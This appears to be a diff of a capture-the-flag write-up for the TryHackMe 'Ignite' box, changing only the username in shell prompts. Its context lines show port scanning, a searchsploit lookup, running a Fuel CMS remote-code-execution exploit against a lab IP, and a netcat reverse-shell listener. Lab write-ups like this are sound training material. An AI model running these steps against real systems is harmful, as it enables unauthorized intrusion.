@@ -12,7 +12,7 @@ Root the box! Designed and created by [DarkStar7471](https://tryhackme.com/p/Dar
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Ignite]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
 └─$ rustscan -a 10.10.182.218 -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -25,7 +25,7 @@ ________________________________________
  --------------------------------------
 Scanning ports: The virtual equivalent of knocking on doors.
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.182.218:80
@@ -61,7 +61,7 @@ Easy peasy.
 We search for Fuel CMS with [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Ignite]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
 └─$ searchsploit Fuel CMS      
 -------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                  |  Path
@@ -81,11 +81,11 @@ Shellcodes: No Results
 We can copy the RCE3 to our directory and use it :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Ignite]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
 └─$ python3 50128.py -u http://10.10.182.218 
-python3: can't open file '/home/hax/THM/CHALLENGES/Easy/Ignite/50128.py': [Errno 2] No such file or directory
+python3: can't open file '/home/mdn0x/THM/CHALLENGES/Easy/Ignite/50128.py': [Errno 2] No such file or directory
                                                                                                                   
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Ignite]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
 └─$ python3 50477.py -u http://10.10.182.218 
 [+]Connecting...
 Enter Command $id
@@ -119,7 +119,7 @@ export TERM=xterm
 www-data@ubuntu:/$ ^Z
 zsh: suspended  nc -lvnp 1337
                                                                                                                    
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Ignite]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
 └─$ stty raw -echo; fg
 [1]  + continued  nc -lvnp 1337
                                reset
